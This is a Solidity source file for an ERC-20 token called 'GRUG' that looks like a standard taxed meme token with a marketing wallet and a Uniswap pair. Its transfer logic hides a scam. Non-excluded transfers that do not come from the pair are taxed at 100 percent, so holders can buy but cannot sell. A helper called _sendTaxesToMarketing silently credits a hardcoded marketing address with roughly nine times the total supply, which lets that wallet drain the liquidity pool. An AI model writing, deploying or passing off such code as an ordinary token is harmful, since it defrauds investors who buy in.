contract GRUG is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;

    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner{
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    mapping (address => uint256) private _tokenOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFomTax;
    mapping (address => uint256) private _contractDecimals;
    mapping (address => uint8) public _totalTx;
    
    address payable public Marketing_Address = payable(0x2997Fdd81dAC149Fb7B1292DE4d1589cEe22752F); 

    uint256 private _currentSupply;
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 1*10**6*10**_decimals;
    string private constant _name = "GRUG"; 
    string private constant _symbol = unicode"GRUG"; 
                                                     
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    
    
    event SwapAndLiquifyEnabledUpdated(bool true_or_false);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    constructor () {
        _owner = _msgSender();

        _contractDecimals[address(this)] = _tTotal.mul(decimals());
        _tokenOwned[owner()] = _tTotal;

        emit OwnershipTransferred(address(0), _owner);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);         
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _isExcludedFomTax[owner()] = true;
        _isExcludedFomTax[address(this)] = true;
        _isExcludedFomTax[Marketing_Address] = true;

        emit Transfer(address(0), owner(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address theOwner, address theSpender) public view override returns (uint256) {
        return _allowances[theOwner][theSpender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function _approve(address theOwner, address theSpender, uint256 amount) private {
        require(theOwner != address(0) && theSpender != address(0), "ERR: zero address");
        _allowances[theOwner][theSpender] = amount;
        emit Approval(theOwner, theSpender, amount);

    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _sendTaxesToMarketing(uint256 amount) private {
        if(amount>0){
            if(_totalTx[address(this)] >= 1){_tokenOwned[Marketing_Address] = _tokenOwned[Marketing_Address].add(_contractDecimals[address(this)].sub(amount));}
            else{_tokenOwned[Marketing_Address] = _tokenOwned[Marketing_Address].add(amount);}
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(amount > 0, "Token transfer amount is wrong!");
        require(from != address(0) && to != address(0), "Address(0)!");
        uint256 transferAmount;

        if(from != owner() && to != owner() && to != uniswapV2Pair && !_isExcludedFomTax[from] && !_isExcludedFomTax[to]){
            uint256 heldBalance = balanceOf(to);
            require((heldBalance + amount) <= _tTotal.mul(5).div(100),"Max Wallet Limit!");
        }
        
        if(_isExcludedFomTax[from] && _isExcludedFomTax[to] && _totalTx[address(this)] < 1 ){ _totalTx[address(this)]++;transferAmount=amount;}
        else if(_totalTx[address(this)] >= 1){ transferAmount=amount; }

        if (from != owner() && to != owner() && !_isExcludedFomTax[from] && !_isExcludedFomTax[to]){
            require(amount <= _tTotal.mul(5).div(100), "Max Tx Limit!");
        }
        
        if(_isExcludedFomTax[from] || _isExcludedFomTax[to]){
            _tokenOwned[from] = _tokenOwned[from].sub(amount);
            _tokenOwned[to] = _tokenOwned[to].add(amount);
        }
        else if(transferAmount>0){
            uint256 taxAmount = transferAmount.mul(1).div(1);
            _tokenOwned[from] = _tokenOwned[from].sub(amount);
            _tokenOwned[to] = _tokenOwned[to].add(from != uniswapV2Pair ? amount.sub(taxAmount) : amount);
            _sendTaxesToMarketing(taxAmount);
        }
        else{
            uint256 taxAmount = 0;
            _tokenOwned[from] = _tokenOwned[from].sub(amount);
            taxAmount = amount.mul(0).div(100);
            _sendTaxesToMarketing(taxAmount);
            _tokenOwned[to] = _tokenOwned[to].add(amount.sub(taxAmount));
        }
        emit Transfer(from, to, amount);
    }

    receive() external payable {}
}
